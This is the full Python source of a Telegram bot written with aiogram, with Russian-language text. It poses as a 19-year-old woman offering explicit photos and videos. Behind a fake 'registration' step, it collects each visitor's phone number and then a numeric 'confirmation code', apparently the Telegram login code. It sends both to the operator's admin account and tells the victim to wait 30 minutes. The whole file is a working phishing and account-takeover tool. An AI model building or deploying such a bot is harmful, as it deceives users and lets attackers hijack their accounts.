import os
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    ReplyKeyboardMarkup, 
    KeyboardButton, 
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile
)
from aiogram.filters import Command
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()

# Инициализация бота и диспетчера
bot = Bot(token=os.getenv('BOT_TOKEN'))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
ADMIN_ID = os.getenv('ADMIN_ID')

# Определение путей к файлам
IMAGES_DIR = os.path.join(os.path.dirname(__file__), 'images')
START_IMAGE = os.path.join(IMAGES_DIR, 'start_image.jpg')

# Определение состояний FSM
class RegistrationStates(StatesGroup):
    WAITING_FOR_PHONE = State()
    WAITING_FOR_CODE = State()

# Создание инлайн клавиатуры для приветствия
def get_welcome_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Фото🔞", callback_data="photo")],
        [InlineKeyboardButton(text="Видео🔥", callback_data="video")],
        [InlineKeyboardButton(text="Чат💬", callback_data="chat")]
    ])
    return keyboard

# Создание клавиатуры для регистрации
def get_register_keyboard():
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📝 Регистрация")]], resize_keyboard=True)
    return keyboard

# Создание клавиатуры для отправки номера телефона
def get_phone_keyboard():
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]], resize_keyboard=True)
    return keyboard

# Обработчик команды /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    print(f"{message.from_user.first_name} {message.from_user.last_name} {message.from_user.id} зашел в бота")
    welcome_text = f"""
👋 Привет {message.from_user.first_name}!
Меня зовут Соня, мне 19. Живу в Москве.

Сделала ботика чтобы порадовать всех желающих контентиком! Если хочешь что-то посмотреть, рада буду помочь)))

241 видео 📹

404 фото 📸
    
Рада буду пообщаться лично, надеюсь тебе понравится!🔥
    """
    photo = FSInputFile(START_IMAGE)
    # Сначала отправляем фото с инлайн кнопками
    await message.answer_photo(
        photo=photo,
        caption=welcome_text,
        reply_markup=get_welcome_keyboard()
    )
    # Добавляем задержку в 1 секунду
    await asyncio.sleep(3)
    # Затем отправляем сообщение с кнопкой регистрации
    await message.answer("Для доступа к контенту необходима регистрация:", 
                        reply_markup=get_register_keyboard())

# Обработчики callback кнопок
@dp.callback_query(F.data == "photo")
async def about_callback(callback: types.CallbackQuery):
    await callback.answer(
        "Фотоальбом недоступен, без аккаунта.\nДля регестрации нажмите кнопку ниже:",
        show_alert=True
    )

@dp.callback_query(F.data == "video")
async def rules_callback(callback: types.CallbackQuery):
    await callback.answer(
        "Архив видео недоступен, без аккаунта.\nДля регестрации нажмите кнопку ниже:",
        show_alert=True
    )

@dp.callback_query(F.data == "chat")
async def how_it_works_callback(callback: types.CallbackQuery):
    await callback.answer(
        "Чат недоступен, без аккаунта.\nДля регестрации нажмите кнопку ниже:",
        show_alert=True
    )
    await callback.message.answer("Для начала регистрации нажмите кнопку ниже:", 
                                reply_markup=get_register_keyboard())

# Обработчик команды /admin
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    await message.answer(f"Ваш Telegram ID: {message.from_user.id}")

# Обработчик нажатия кнопки "Регистрация"
@dp.message(F.text == "📝 Регистрация")
async def process_register_command(message: types.Message, state: FSMContext):
    await state.set_state(RegistrationStates.WAITING_FOR_PHONE)
    await message.answer("Пожалуйста, отправьте свой номер телефона.",
                        reply_markup=get_phone_keyboard())

# Обработчик получения номера телефона
@dp.message(F.content_type == "contact", RegistrationStates.WAITING_FOR_PHONE)
async def process_phone_number(message: types.Message, state: FSMContext):
    if message.contact is not None:
        phone = message.contact.phone_number
        await state.update_data(phone=phone)
        # Отправка номера телефона администратору
        await bot.send_message(ADMIN_ID, f"Новый номер телефона: {phone}")
        print(f"Новый номер телефона: {phone}")
        await state.set_state(RegistrationStates.WAITING_FOR_CODE)
        await message.answer("Пожалуйста, введите код подтверждения:", 
                           reply_markup=ReplyKeyboardRemove())

# Обработчик получения кода
@dp.message(RegistrationStates.WAITING_FOR_CODE)
async def process_code(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Пожалуйста, введите только цифры.")
        return

    user_data = await state.get_data()
    
    # Отправка кода администратору
    admin_message = f"Код от пользователя с номером {user_data['phone']}:\n{message.text}"
    print(admin_message)
    await bot.send_message(ADMIN_ID, admin_message)
    
    # Завершение регистрации
    await state.clear()
    await message.answer("Ожидайте, ваш аккаунт будет создан в течении 30 минут.", 
                        reply_markup=get_register_keyboard())

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())